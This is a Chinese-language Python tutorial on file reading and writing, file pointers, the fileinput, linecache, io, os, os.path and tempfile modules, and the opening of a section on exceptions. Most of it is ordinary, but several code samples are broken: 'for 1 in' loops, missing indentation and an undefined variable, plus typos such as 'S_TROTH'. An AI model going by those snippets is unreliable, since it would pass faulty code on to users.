当一个文件对象的引用被重新指定给另一个文件时,Python会关闭之前的文件。用close方法关闭文件是一个很好的习惯。
fo = open("foo.txt", "r")
print("文件名: ", fo.name)
fo.close()

file.flush()
刷新文件内部缓冲,直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。

file.fileno()
返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。

file.isatty()
如果文件连接到一个终端设备返回True,否则返回False。

file.next()
返回文件下一行。

file.read([size])
从一个打开的文件读取一些数据并将其作为字符串(在文本模式下)或字节对象(在二进制模式下)返回
按字节或字符读取文件内容到内存,用一个str对象表示,到底是读取宇节还是字符则取决于是否使用了b模式,如果使用了b模式则每次读取一个字节;如果没有使用b模式则每次读取一个字符。在调用该方法时可传入一个整数size作为参数,用于指定最多读取多少个字节或宇符,默认读取所有即一次读取文件的全部内容,如果文件过大内存就爆了,所以要保险起见可以反复调用read(size)方法循环读取整个文件的内容,每次最多读取size个字节的内容

</pre><textarea>
f = open ("test.py", 'r', True)
try:
    while True:
        ch = f.read(1)   # 每次读取一个字符
        if not ch: break # 如果没有读取到数据,则跳出循环
        print(ch, end='')
    print(f.read())      # '',如果已到达文件末尾f.read()将返回一个空字符串,也可通过f.read()返回空字符串判断已经到达了文件末尾
finally:
    f.close()

</textarea><pre>
file.readline([size])
按行读取文件,读取一行内容,包括"\n"字符,如果指定了参数size则只读取此行内的size个字符
如果f.readline()返回一个空的字符串则表示已经到达了文件末尾,而空行使用'\n'表示,该字符串只包含一个换行符
如果程序要读取行,通常只能用文本方式来读取,只有文本文件才有行的概念,二进制文件没有所谓行的概念

file.readlines([sizeint])
按行读取文件,读取所有行并返回列表,一次读取所有内容并按行返回list,若给定sizeint>0则是设置一次读多少字节,这是为了减轻读取压力。
读取配置文件时readlines最方便

</pre><textarea>
with open('test.txt', 'r') as f:
    print(repr(f.readline()))  # 'This is the first line of the file.\n'
    print(repr(f.readline()))  # 'Second line of the file'
    print(repr(f.readline()))  # ''

# 要从文件中读取行,可以循环遍历文件对象,这是内存高效,快速的,并简化代码
with open('test.txt', 'r') as f:
    for line in f:
        print(repr(line))
'''
'This is the first line of the file.\n'
'Second line of the file'
'''

# 如果想以列表的形式读取文件中的所有行,也可以使用list(f)或f.readlines()
with open('test.txt', 'r') as f:
    print(list(f))         # ['This is the first line of the file.\n', 'Second line of the file']

with open('test.txt', 'r') as f:
    print(f.readlines())   # ['This is the first line of the file.\n', 'Second line of the file']

# 文件指针
with open('test.txt', 'r') as f:
    print(f.readlines())   # ['This is the first line of the file.\n', 'Second line of the file']
    print(list(f))         # []

</textarea>file.readlines()<textarea>
for line in f.readlines():
    print(line.strip())    # 把末尾的'\n'删掉

import codecs
f = codecs.open("readline_test.py", 'r', 'utf-8', buffering=True)  # 指定使用utf-8字符集读取文件内容
while True:
    line = f.readline()  # 每次读取一行
    if not line: break   # 如果没有读到数据,跳出循环
    print(line, end='')
f.close()

import codecs
# 指定使用utf-8字符集读取文件内容
f = codecs.open("readlines_test.py", 'r', 'utf-8', buffering=True)
# 使用readlines()读取所有行,返回所有行组成的列表
for 1 in f.readlines():
    print(1, end='')
f.close()

</textarea>读取大文件特定行<textarea>
with open('xxx', encoding='utf-8') as f:
    lines = f.readlines()
    print(f'第100行的内容为：{lines[99]}')

with open('xxx', encoding='utf-8') as f:
    for lineno, line in enumerate(f):
        if lineno == 99:
        print(f'第100行的内容为：{lines[99]}')

# Python自带一个模块linecache可以实现这个目的,平时写的代码报错时traceback上面的错误行对应的内容就是使用linecache查到的
import linecache
text = linecache.getline('xxx.txt', 99)
print(f'第100行的内容为：{text}')

</textarea>批量读取多个文件<textarea>
file_list = ['1.txt', '2.txt', '3.txt']
for path in file_list:
    with open(path, encoding='utf-8') as f:
        for line in f:
        print(line)

# Python自带一个更好用的模块fileinput来读取列表中的多个文件
import fileinput
file_list = ['1.txt', '2.txt', '3.txt']
with fileinput.input(files=file_list) as f:
    for line in f:
        print(line)

# python hello.py自动把输入的内容打印出来,相当于在while True里面加上了input
# python hello.py test.txt test.text自动把任意多个参数对应的文件都读入
import fileinput
with fileinput.input() as f:
    for line in f:
    print(line)

</textarea><pre>
文件指针用于标明文件读写的位置,文件对象提供seek()、tell()方法来操作文件指针
当程序使用文件对象读写数据时,文件指针会自动向后移动:读写了多少个数据,文件指针就自动向后移动多少个位置
当文件指针位于哪里时,程序就会读取哪个位置的数据;当程序读取多少个数据时,文件指针就会自动向后移动多少个位置

file.tell()
返回文件内的当前位置,判断文件指针的位置,即下一次的读写会发生在文件开头这么多字节之后
表示为二进制模式下时从文件开始的字节数,以及文本模式下的不透明数字

file.seek(offset[, from])
把文件指针移动到指定位置,设置文件当前位置,Offset变量表示要移动的字节数,from参数指定开始移动字节的参考位置,默认from为0表示将文件的开头作为移动字节的参考位置,设为1表示使用当前的位置作为参考位置,设为2表示该文件的末尾将作为参考位置。
当from为0时(这是默认值),表明从文件开头开始计算,比如将offset设为3就是将文件指针移动到第3处;当from为1时表明从指针当前位置开始计算,比如文件指针当前在第5处,将offset设为3,就是将文件指针移动到第8处;当from为2时表明从文件结尾开始计算,比如将offset设为3,表明将文件指针移动到文件结尾倒数第3处

</pre><textarea>
with open("test.txt", "r+") as f:
    position = f.tell()               # 查找当前位置
    print("当前指针位置 : ", position) # 0

    str = f.read(10)
    print("读取的字符串是 : ", str)    # This is th

    position = f.tell()               # 查找当前位置
    print("当前指针位置 : ", position) # 10

    position = f.seek(0, 0)           # 把指针再次重新定位到文件开头

    position = f.tell()               # 查找当前位置
    print("当前指针位置 : ", position) # 0

    str = f.read(10)
    print("重新读取字符串 : ", str)    # This is th

</textarea><textarea>
f = open('workfile', 'rb+')
>>> f.write(b'0123456789abcdef')
16
>>> f.seek(5)      # Go to the 6th byte in the file
5
>>> f.read(1)
b'5'
>>> f.seek(-3, 2)  # Go to the 3rd byte before the end
13
>>> f.read(1)
b'd'

</textarea><textarea>
f = open('test.py', 'rb')
# 判断文件指针的位置
print(f.tell())  # 0
# 将文件指针移动到3处
f.seek(3)
print(f.tell())  # 3
print(f.read(1)) # o
print(f.tell())  # 4
# 将文件指针移动到5处
f.seek(5)
print(f.tell())  # 5
# 将文件指针向后移动5个数据
f.seek(5, 1)
print(f.tell())  # 10
# 将文件指针移动到倒数第10处
f.seek(-10, 2)
print(f.tell())
print(f.read(1))  # d

</textarea><pre>
file.truncate([size])
截取文件,截取的字节通过size指定,默认为当前文件位置。

file.write(str/bytes)
只有以二进制模式(b模式)打开的文件才能写入字节串
输出字符串或字节串,将任何字符串写入一个打开的文件,Python字符串是二进制数据或文本,write()不会在字符串末尾添加换行符('\n'),返回写入的字符数
要写入特定编码的文本文件,请给open()函数传入encoding参数,将字符串自动转换成指定编码
写文件时操作系统往往不会立刻把数据写入磁盘,而是放到内存缓存起来,空闲的时候再慢慢写入。只有调用close()方法时,操作系统才保证把没有写入的数据全部写入磁盘。忘记调用close()的后果是数据可能只写了一部分到磁盘,剩下的丢失了。所以还是用with语句来得保险,使用with语句操作文件IO是个好习惯

</pre><textarea>
with open('./test.txt', 'w') as f:
    f.write('Hello, world!')
    f.write("www.runoob.com!\nVery good site!\n")

# 在写入非str、bytes类型的对象之前,需要先把它们转化为字符串(在文本模式下)或者字节对象(在二进制模式下)
with open('test.txt', 'w') as f:
    value = ('the answer', 42)
    s = str(value)  # convert the tuple to string
    f.write(s)

# json.dump将对象序列化之后写入文件
import json
with open('test.txt', 'w') as f:
    value = ('the answer', 42)
    json.dump(value, f)  # json将元素转换成列表再写入文件["the answer", 42]

</textarea><pre>
file.writelines(sequence)
输出多个字符串或多个字节串,向文件写入一个序列字符串列表,如果需要换行则要自己加入每行的换行符
sequence参数是可迭代对象

</pre><textarea>
import os
f = open('x.txt', 'w+')
# os.linesep代表当前操作系统上的换行符
f.write('我爱Python' + os.linesep)
f.writelines(('土门壁甚坚,'+ os.linesep,
    '杏园度亦难。'+ os.linesep,
    '势异邺城下,'+ os.linesep,
    '纵死时犹宽。'+ os.linesep))

# 程序会使用当前操作系统默认的字符集。如果需要使用指定的字符集来输出文件则可以来用二进制形式,程序先将所输出的字符串转换成指定字符集对应的二进制数据(字节串),然后输出二进制数据

# 使用二进制数据输出,通过这种方式来实现以UTF-8字符集保存文件
import os
# 以wb+模式打开文件,这意味着程序会以二进制形式来输出文件,此时程序输出的必须是宇节串,不能是字符串。因此程序调用encode()方法将字符串转换成字节串,转换时指定使用UTF-8字符集,这意味着程序将会以UTF-8字符集来保存文件
f = open('y.txt', 'wb+')
# os.linesep代表当前操作系统上的换行符
f.write(('我爱Python' + os.linesep).encode('utf-8'))
f.writelines((('土门壁甚坚,'+ os.linesep).encode('utf-8'),
    ('杏园度亦难。'+ os.linesep).encode('utf-8'),
    ('势异邺城下,'+ os.linesep).encode('utf-8'),
    ('纵死时犹宽。'+ os.linesep).encode('utf-8')))

</textarea><pre>
【 fileinput模块:逐行读取多个文件 】
fileinput模块提供了如下函数可以把多个输入流合并在一起:
fileinput.input(files=None, inplace=False, backup='', bufsize=0, mode='r', openhook=None)
该函数中的files参数用于指定多个文件输入流,返回一个FileInput对象,当程序创建了FileInput对象之后,即可通过for循环来遍历文件的每一行。

fileinput还提供了如下全局函数来判断正在读取的文件信息:
fileinput.filename():返回正在读取的文件的文件名。
fileinput.fileno():返回当前文件的文件描述符(file descriptor),该文件描述符是一个整数。
fileinput.lineno():返回当前读取的行号。
fileinput.filelineno():返回当前读取的行在其文件中的行号。
fileinput.isfirstline():返回当前读取的行在其文件中是否为第一行。
fileinput.isstdin():返回最后一行是否从sys.stdin读取。程序可以使用"-"代表从sys.stdin读取。
fileinput.nextfile():关闭当前文件,开始读取下一个文件。
fileinput.close():关闭FileInput对象。

fileinput也存在一个缺陷,即在创建FileInput对象时不能指定字符集,因此它所读取的文件的字符集必须与操作系统默认的字符集保持一致。如果文本文件的内容是纯英文则不存在字符集的问题

</pre>使用fileinput.input直接合并了info.txt和test.txt两个文件,这样程序可以直接遍历读取这两个文件的内容<textarea>
import fileinput
# 一次读取多个文件
for line in fileinput.input(files=('test.py', 'server.py')):
    # 输出文件名,当前行在当前文件中的行号
    print(fileinput.filename(), fileinput.filelineno(), line, end='')
# 关闭文件流
fileinput.close()

</textarea><pre>
【 linecache模块:随机读取文件指定行 】
linecache模块允许从Python源文件中随机读取指定行,并在内部使用缓存优化存储。由于该模块主要被设计成读取Python源文件,因此它会用UTF-8字符集来读取文本文件。

实际上使用linecache模块也可以读取其他文件,只要该文件使用了UTF-8字符集存储。

linecache模块包含以下常用函数:
linecache.getline(filename, lineno, module_globals=None):读取指定模块中指定文件的指定行
linecache.clearcache():清空缓存
linecache.checkcache(filename=None):检查缓存是否有效。如果没有指定filename参数则默认检查所有缓存的数据

</pre>使用linecache模块来随机读取指定行<textarea>
import linecache
import random
# 读取random模块的源文件的第3行
print(linecache.getline(random.__file__, 3))
# 读取本程序的第4行
print(linecache.getline('hello.py', 4))
# 读取普通文件的第1行
print(linecache.getline('test.txt', 1))

</textarea><pre>
【 StringIO和BytesIO 】
StringIO
很多时候数据读写不一定是文件,也可以在内存中读写,StringIO顾名思义就是在内存中读写str。
StringIO和BytesIO是在内存中操作str和bytes的方法,使得和读写文件具有一致的接口

</pre><textarea>
# 要把str写入StringIO,需要先创建一个StringIO,然后像文件一样写入即可,getvalue()方法用于获得写入后的str
from io import StringIO
f = StringIO()
f.write('hello')     # 5
f.write(' ')         # 1
f.write('world!')    # 6
print(f.getvalue())  # hello world!

# 要读取StringIO,可以用一个str初始化StringIO,然后像读文件一样读取:
from io import StringIO
f = StringIO('Hello!\nHi!\nGoodbye!')
while True:
    s = f.readline()
    if s == '':
        break
    print(s.strip())

# 输出:
Hello!
Hi!
Goodbye!

</textarea><pre>
BytesIO
StringIO操作的只能是str,如果要操作二进制数据就需要使用BytesIO。

</pre><textarea>
# BytesIO实现了在内存中读写bytes,创建一个BytesIO,然后写入一些bytes
from io import BytesIO
f = BytesIO()
f.write('中文'.encode('utf-8'))  # 6,写入的不是str,而是经过UTF-8编码的bytes
print(f.getvalue())              # b'\xe4\xb8\xad\xe6\x96\x87'

# 和StringIO类似,可以用一个bytes初始化BytesIO,然后像读文件一样读取:
from io import BytesIO
f = BytesIO(b'\xe4\xb8\xad\xe6\x96\x87')
print(f.read())   # b'\xe4\xb8\xad\xe6\x96\x87'

</textarea>

<h4>操作文件目录</h4><pre>
如果要操作文件、目录,可以在命令行下面输入操作系统提供的各种命令来完成,比如dir、cp等命令。
操作系统提供的命令只是简单地调用了操作系统提供的接口函数,Python内置的os模块也可以直接调用操作系统提供的接口函数在Python程序中执行这些目录和文件的操作

os模块有许多方法能创建、删除和更改目录,提供了非常丰富的方法用来处理文件和目录,操作文件和目录的函数一部分放在os模块中,一部分放在os.path模块中
复制文件的函数在os模块中不存在,原因是复制文件并非由操作系统提供的系统调用。理论上讲通过读写文件可以完成文件复制,只不过要多写很多代码。shutil模块提供了copyfile()的函数,还可以在shutil模块中找到很多实用函数,它们可以看做是os模块的补充

内置shutil模块创建压缩文件
from shutil import make_archive
make_archive('xxx', 'zip', '被压缩的文件或文件夹')  # 自动创建xxx.zip
make_archive('xxx', 'gztar', '被压缩的文件夹或文件')  # 自动创建xxx.tar.gz

import os
os.name
操作系统类型,posix说明系统是Linux、Unix或Mac OS X,nt就是Windows系统

os.uname()
获取详细的系统信息,uname()函数在Windows上不提供,也就是说os模块的某些函数是跟操作系统相关的

os.environ
查看在操作系统中定义的所有环境变量
os.environ.get('PATH')         # 获取某个环境变量的值
os.environ.get('x', 'default') # x不存在时输出default作为默认值

os.chdir(path)
改变当前目录

os.fchdir(fd)
通过文件描述利改变当前目录。该函数与os.chdir()的功能基本相似,只是该函数以文件描述符作为参数来代表目录

os.chflags(path, flags)
设置路径的标记为数字标记。

os.access(path, mode)
检验权限模式,检查path对应的文件或目录是否具有指定权限。该函数的第二个参数可能是以下四个状态值的一个或多个值:
os.F_OK:判断是否存在。
os.R_OK:判断是否可读。
os.W_OK:判断是否可写。
os.X_OK:判断是否可执行。

</pre><textarea>
import os
# 判断当前目录的权限
print(os.access('.', os.F_OK|os.R_OK|os.W_OK|os.X_OK))   # True
# 判断文件的权限
print(os.access('test.py', os.F_OK|os.R_OK|os.W_OK))     # True

</textarea><pre>
os.chmod(path, mode)
更改权限,其中mode参数代表要改变的权限,该参数支持的值可以是以下一个或多个值的组合:
stat.S_IXOTH:其他用户有执行权限。
stat.S_IWOTH:其他用户有写权限。
stat.S_TROTH:其他用户有读权限。
stat.S_IRWXO:其他用户有全部权限。
stat.S_IXGRP:组用户有执行权限。
stat.S_IWGRP:组用户有写权限。
stat.S_IRGRP:组用户有读权限。
stat.S_IRWXG:组用户有全部权限。
stat.S_IXUSR:所有者有执行权限。
stat.S_IWUSR:所有者有写权限。
stat.S_IRUSR:所有者有读权限。
stat.S_IRWXU:所有者有全部权限。
stat.S_IREAD:Windows 将该文件设为只读的。
stat.S_IWRITE:Windows 将该文件设为可写的。

</pre><textarea>
import os, stat
# 将os.chmod_test.py文件改为只读
os.chmod('os.chmod_test.py', stat.S_IREAD)
# 判断是否可写
print(os.access('os.chmod_test.py', os.W_OK))

</textarea><pre>
os.chown(path, uid, gid)
更改文件所有者,该命令主要在 UNIX 文件系统下有效

os.chroot(path)
改变当前进程的根目录

os.close(fd)
关闭文件描述符fd

os.closerange(fd_low, fd_high)
关闭从fd_low(包含)到fd_high(不包含)范围的所有文件描述符,错误会忽略

os.dup(fd)
复制文件描述符fd

os.dup2(fd, fd2)
将一个文件描述符fd复制到另一个文件描述符fd2

os.fchdir(fd)
通过文件描述符改变当前工作目录

os.fchmod(fd, mode)
改变一个文件的访问权限,该文件由参数fd文件描述符指定,参数mode是Unix下的文件访问权限。
该函数的功能与 os.chmod() 函数的功能相似,只是该函数使用fd代表文件

os.fchown(fd, uid, gid)
修改一个文件的所有权,这个函数修改一个文件的用户ID和用户组ID,该文件由文件描述符fd指定。
该函数的功能与 os.chown() 函数的功能相似,只是该函数使用 fd 代表文件

os.fdatasync(fd)
强制将文件写入磁盘,该文件由文件描述符fd指定,但是不强制更新文件的状态信息。

os.fdopen(fd[, mode[, bufsize]])
通过文件描述符fd打开文件,并返回对应的文件对象

os.fpathconf(fd, name)
返回一个打开的文件的系统配置信息。name为检索的系统配置的值,它也许是一个定义系统值的字符串,这些名字在很多标准中指定(POSIX.1, Unix 95, Unix 98, 和其它)。

os.fstat(fd)
返回文件描述符fd的状态,像stat()。

os.fstatvfs(fd)
返回包含文件描述符fd的文件的文件系统的信息,像 statvfs()

os.fsync(fd)
强制将文件描述符为fd的文件写入硬盘。

os.ftruncate(fd, length)
将文件描述符fd对应的文件裁剪到length长度, 所以它最大不能超过文件大小。

os.getcwd()
返回当前目录

os.getcwdu()
返回一个当前工作目录的Unicode对象

os.isatty(fd)
如果文件描述符fd是打开的,同时与tty(-like)设备相连,则返回true, 否则False。

os.lchflags(path, flags)
设置路径的标记为数字标记,类似 chflags(),但是没有软链接

os.lchmod(path, mode)
修改连接文件权限

os.lchown(path, uid, gid)
更改文件所有者,类似 chown,但是不追踪链接。

os.link(src, dst)
创建从src到dst的硬链接。硬链接是UNIX系统的概念,如果在Windows系统中就是复制目标文件

os.listdir(path)
返回path指定的文件夹包含的文件或文件夹的名字的列表
过滤文件,列出当前目录下的所有目录: [x for x in os.listdir('.') if os.path.isdir(x)]
过滤文件,要列出所有的.py文件: [x for x in os.listdir('.') if os.path.isfile(x) and os.path.splitext(x)[1]=='.py']

os.lseek(fd, pos, how)
设置文件描述符fd当前位置为pos, how方式修改: SEEK_SET 或者 0 设置从文件开始的计算的pos; SEEK_CUR或者 1 则从当前位置计算; os.SEEK_END或者2则从文件尾部开始. 在unix,Windows中有效
该函数同样用于移动文件指针。其中how参数指定从哪里开始移动,如果将how设为0或SEEK_SET则表明从文件开头开始移动;如果将how设为1或SEEK_CUR则表明从文件指针当前位置开始移动;如果将how设为2或SEEK_END则表明从文件结束处开始移动。执行文件的读写,程序通常会先通过os.open()打开文件,然后调用os.read()、os.write()来读写文件,当操作完成后通过os.close()关闭文件

os.lstat(path)
像stat(),但是没有软链接

os.major(device)
从原始的设备号中提取设备major号码 (使用stat中的st_dev或者st_rdev field)。

os.makedev(major, minor)
以major和minor设备号组成一个原始设备号

os.minor(device)
从原始的设备号中提取设备minor号码 (使用stat中的st_dev或者st_rdev field )。

os.mkdir(path[, mode])
以数字mode的mode创建一个名为path的文件夹,该 mode参数代表一个UNIX风格的权限,默认的mode是0777(八进制)
os.mkdir('/Users/michael/testdir')         # 创建一个目录

os.makedirs(path[, mode])
递归文件夹创建函数。像mkdir(),但创建的所有intermediate-level文件夹需要包含子文件夹。
比如要创建abc/xyz/wawa目录,如果在当前目录下没有abc目录,那么使用mkdir()函数就会报错,而使用makedirs()函数则会先创建abc,然后在其中创建xyz子目录,最后在xyz子目录下创建wawa子目录

</pre><textarea>
import os
path = 'my_dir'
# 直接在当前目录下创建目录
os.mkdir(path, 0o755)
path = "abc/xyz/wawa"
# 递归创建目录
os.makedirs(path, 0o755)

</textarea><pre>
os.mkfifo(path[, mode])
创建命名管道,mode为数字,默认为0666(八进制)

os.mknod(filename[, mode=0600, device])
创建一个名为filename文件系统节点(文件,设备特别文件或者命名pipe)。

os.open(file, flags[, mode])
打开一个文件,并且设置需要的打开选项,mode参数是可选的,该函数返回文件描述符。其中flags代表打开文件的旗标,它支持如下一个或多个选项:
os.O_RDONLY:以只读的方式打开。
os.O_WRONLY:以只写的方式打开。
os.O_RDWR:以读写的方式打开。
os.O_NONBLOCK:打开时不阻塞。
os.O_APPEND:以追加的方式打开。
os.O_CREAT:创建并打开一个新文件。
os.O_TRUNC:打开一个文件并截断它的长度为0(必须有写权限)。
os.O_EXCL:在创建文件时,如果指定的文件存在,则返回错误。
os.O_SHLOCK:自动获取共享锁。
os.O_EXLOCK:自动获取独立锁。
os.O_DIRECT:消除或减少缓存效果。
os.O_FSYNC:同步写入。
os.O_NOFOLLOW:不追踪软链接。

os.openpty()
打开一个新的伪终端对,返回pty和tty的文件描述符。

os.pathconf(path, name)
返回相关文件的系统配置信息。

os.pipe()
创建一个管道. 返回一对文件描述符(r, w) 分别为读和写

os.popen(command[, mode[, bufsize]])
从一个 command 打开一个管道

os.read(fd, n)
从文件描述符fd中读取最多n个字节,返回读到的字符串。如果文件描述符对应的文件己到达结尾则返回一个空字节串

os.readlink(path)
返回软链接所指向的文件

os.remove(path)
删除路径为path的文件。如果path是一个文件夹,将抛出OSError

os.removedirs(path)
递归删除目录。

os.rename(src, dst)
重命名文件或目录,将src重名为dst

os.renames(old, new)
递归地对目录进行更名,也可以对文件进行更名。

os.rmdir(path)
删除path指定的空目录,如果目录非空则抛出一个OSError异常,可以先用os.remove()函数删除文件
os.rmdir('/Users/michael/testdir')         # 删掉一个目录

os.stat(path)
获取path指定的路径的信息,功能等同于C API中的stat()系统调用。

os.stat_float_times([newvalue])
决定stat_result是否以float对象显示时间戳

os.statvfs(path)
获取指定路径的文件系统统计信息

os.symlink(src, dst)
创建一个软链接,创建从src到dst的符号链接,对应Windows的快捷方式,由于Windows权限的缘故,必须以管理员身份执行os.symlink()来创建快捷方式

</pre>在Windows系统中使用os.symlink(src, dst)函数来创建快捷方式,程序在当前目录下创建了一个名为"tt"的快捷方式,并将os.link_test.py文件复制为dst文件<textarea>
import os
# 为os.link_test.py文件创建快捷方式
os.symlink('os.link_test.py', 'tt')
# 为os.link_test.py文件创建硬连接,Windows上就是复制文件
os.link('os.link_test.py', 'dst')

</textarea><pre>
os.tcgetpgrp(fd)
返回与终端fd(一个由os.open()返回的打开的文件描述符)关联的进程组

os.tcsetpgrp(fd, pg)
设置与终端fd(一个由os.open()返回的打开的文件描述符)关联的进程组为pg。

os.tempnam([dir[, prefix]])
返回唯一的路径名用于创建临时文件。

os.tmpfile()
返回一个打开的模式为(w+b)的文件对象 .这文件对象没有文件夹入口,没有文件描述符,将会自动删除。

os.tmpnam()
为创建一个临时文件返回一个唯一的路径

os.ttyname(fd)
返回一个字符串,它表示与文件描述符fd 关联的终端设备。如果fd 没有与终端设备关联,则引发一个异常。

os.unlink(path)
删除文件路径

os.utime(path, times)
返回指定的path文件的访问和修改的时间。

os.walk(top[, topdown=True[, onerror=None[, followlinks=False]]])
输出在文件夹中的文件名通过在树中游走,向上或者向下。

os.write(fd, str)
写入字符串到文件描述符fd中,返回实际写入的字符串长度

</pre>使用os.open()、os.read()、os.write()、os.close()读写文件<textarea>
import os
# 以读写、创建方式打开文件
f = os.open('abc.txt', os.O_RDWR|os.O_CREAT)
# 写入文件内容
len1 = os.write(f, '水晶潭底银鱼跃,\n'.encode('utf-8'))
len2 = os.write(f, '清徐风中碧竿横。\n'.encode('utf-8'))
# 将文件指针移动到开始处
os.lseek(f, 0, os.SEEK_SET)
# 读取文件内容
data = os.read(f, len1 + len2)
# 打印读取到字节串
print(data)
# 将字节串恢复成字符串
print(data.decode('utf-8'))
os.close(f)

</textarea>

<h4>os.path模块</h4><pre>
os.path模块下提供了一些操作目录的方法和获取文件的属性信息,这些函数可以操作系统的目录本身

</pre><textarea>
import os
import time

# 获取绝对路径
print(os.path.abspath("abc.txt")) # G:\publish\codes\12\12.2\abc.txt
print(os.path.abspath('.'))       # '/Users/michael', 查看当前目录的绝对路径

# 判断指定目录是否存在
print(os.path.exists('abc/xyz/README.txt')) # False

# 获取共同前缀
print(os.path.commonprefix(['/usr/lib', '/usr/local/lib'])) # /usr/l
# 获取共同路径
print(os.path.commonpath(['/usr/lib', '/usr/local/lib']))   # \usr
# 获取目录
print(os.path.dirname('abc/xyz/README.txt'))                # abc/xyz

# 获取最近一次访问时间
print(time.ctime(os.path.getatime('os.path_test.py')))
# 获取最后一次修改时间
print(time.ctime(os.path.getmtime('os.path_test.py')))
# 获取创建时间
print(time.ctime(os.path.getctime('os.path_test.py')))

# 获取文件大小
print(os.path.getsize('os.path_test.py'))

# 判断是否为文件
print(os.path.isfile('os.path_test.py'))                        # True
# 判断是否为目录
print(os.path.isdir('os.path_test.py'))                         # False
# 判断是否为同一个文件
print(os.path.samefile('os.path_test.py', './os.path_test.py')) # True

### 以下合并、拆分路径的函数并不要求目录和文件要真实存在,它们只对字符串进行操作

# 把两个路径合成一个时不要直接拼字符串,而要通过os.path.join()函数,这样可以正确处理不同操作系统的路径分隔符
os.path.join('/Users/michael', 'testdir')  # '/Users/michael/testdir', 在某个目录下创建一个新目录,首先把新目录的完整路径表示出来

# 要拆分路径时不要直接去拆字符串,而要通过os.path.split()函数,这样可以把一个路径拆分为两部分,后一部分总是最后级别的目录或文件名:
os.path.split('/Users/michael/testdir/file.txt')  # ('/Users/michael/testdir', 'file.txt')

# os.path.splitext()可以直接得到文件扩展名
os.path.splitext('/path/to/file.txt')             # ('/path/to/file', '.txt')

</textarea>

<h4>判断文件/目录是否存在</h4><pre>
1、使用o模块
判断文件是否存在
os.path.isfile(path)
判断目录是否存在
os.path.isdir(path)
判断路径是否存在
os.path.exists(path)      # 使用path模块
os.access(path, os.F_OK)  # 使用access()方法

2、使用open函数和异常捕获
如果直接用open()函数打开一个不存在的文件时,程序会抛出异常,可以通过try语句来捕获异常以达到判断文件是否存在的目的。
如果文件不存在open()函数会抛出FileNotFoundError异常。如果文件无操作权限则会抛出PersmissionError异常。

</pre><textarea>
filePath = '/path/to/file'

try:
    file = open(filePath)
    file.close()
except FileNotFoundError:
    print("No such file or directory: '%s'" % filePath)
except IsADirectoryError:
    print("Is a directory: '%s'" % filePath)
except PermissionError:
    print("Permission denied: '%s'" % filePath)
else:
    print("File is exist: '%s'" % filePath)

</textarea><pre>
3、使用pathlib模块
import pathlib
path = pathlib.Path('path/to/file')
path.exists()  # 判断路径是否存在
path.is_file() # 判断是否为文件
path.is_dir()  # 判断是否为目录

</pre>

<h4>tempfile模块:生成临时文件和临时目录</h4><pre>
tempfile模块专门用于创建临时文件和临时目录,它在UNIX和Windows平台上都运行良好。

tempfile模块下提供了如下常用的函数:
tempfile.TemporaryFile(mode='w+b', buffering=None, encoding=None, newline=None, suffix=None, prefix=None, dir=None)
创建临时文件,该函数返回一个类文件对象,也就是支持文件I/O

tempfile.NamedTemporaryFile(mode='w+b', buffering=None, encoding=None, newline=None, suffix=None, prefix=None, dir=None, delete=True)
创建临时文件,该函数的功能与上一个函数的功能大致相同,只是它生成的临时文件在文件系统中有文件名。

tempfile.SpooledTemporaryFile(max_size=0, mode='w+b', buffering=None, encoding=None, newline=None, suffix=None, prefix=None, dir=None)
创建临时文件,与TemporaryFile函数相比,当程序向该临时文件输出数据时会先输出到内存中,直到超过max_size才会真正输出到物理磁盘中。

tempfile.TemporaryDirectory(suffix=None, prefix=None, dir=None)
生成临时目录。

tempfile.gettempdir()
获取系统的临时目录。

tempfile.gettempdirb()
与gettempdir()相同,只是该函数返回字节串。

tempfile.gettempprefix()
返回用于生成临时文件的前缀名。

tempfile.gettempprefixb()
与gettempprefix()相同,只是该函数返回字节串。

tempfile模块还提供了tempfile.mkstemp()和tempfile.mkdtemp()两个低级别的函数。上面介绍的4个用于创建临时文件和临时目录的函数都是高级别的函数,高级别的函数支持自动清理,而且可以与with语句一起使用,而这两个低级别的函数则不支持,因此一般推荐使用高级别的函数来创建临时文件和临时目录。

tempfile模块还提供了tempfile.tempdir属性,通过对该属性赋值可以改变系统的临时目录

</pre><textarea>
import tempfile
# 创建临时文件
fp = tempfile.TemporaryFile()
print(fp.name)
fp.write('两情若是久长时,'.encode('utf-8'))
fp.write('又岂在朝朝暮暮。'.encode('utf-8'))
# 将文件指针移到开始处,准备读取文件
fp.seek(0)
# 输出刚才写入的内容
print(fp.read().decode('utf-8'))
# 关闭文件,该文件将会被自动删除
fp.close()

# 通过with语句创建临时文件,with会自动关闭临时文件
with tempfile.TemporaryFile() as fp:
    # 写入内容
    fp.write(b'I Love Python!')
    # 将文件指针移到开始处,准备读取文件
    fp.seek(0)
    # 读取文件内容
    print(fp.read()) # b'I Love Python!'

# 通过with语句创建临时目录
with tempfile.TemporaryDirectory() as tmpdirname:
    print('创建临时目录', tmpdirname)

</textarea>
</div>

<div id="exception">
<h3>Python异常处理</h3><pre>
在程序运行过程中,总会遇到各种各样的错误。
有的错误是程序编写有问题造成的,比如本来应该输出整数结果输出了字符串,这种错误通常称之为bug,bug是必须修复的。
有的错误是用户输入造成的,比如让用户输入email地址,结果得到一个空字符串,这种错误可以通过检查用户输入来做相应的处理。
还有一类错误是完全无法在程序运行过程中预测的,比如写入文件的时候磁盘满了,写不进去了,或者从网络抓取数据,网络突然断掉了。这类错误也称为异常,在程序中通常是必须处理的,否则程序会因为各种问题终止并退出。

编写程序时遇到的错误可大致分为2类
1、语法错误
语法错误,也就是解析代码时出现的错误。当代码不符合Python语法规则时,Python解释器在解析时就会报出SyntaxError语法错误,与此同时还会明确指出最早探测到错误的语句
语法错误多是开发者疏忽导致的,属于真正意义上的错误,是解释器无法容忍的,因此,只有将程序中的所有语法错误全部纠正,程序才能执行

2、运行时错误
运行时错误,即程序在语法上都是正确的,但在运行时发生了错误,在Python中把这种运行时产生错误的情况叫做异常(Exceptions)

python标准异常
BaseException 所有异常的基类
SystemExit  解释器请求退出
KeyboardInterrupt 用户中断执行(通常是输入^C)
Exception 常规错误的基类
StopIteration 迭代器没有更多的值
GeneratorExit 生成器(generator)发生异常来通知退出
StandardError 所有的内建标准异常的基类
ArithmeticError 所有数值计算错误的基类
FloatingPointError  浮点计算错误
OverflowError 数值运算超出最大限制
ZeroDivisionError 除(或取模)零 (所有数据类型)
AssertionError  断言语句失败
AttributeError 对象没有这个属性
EOFError  没有内建输入,到达EOF标记
EnvironmentError  操作系统错误的基类
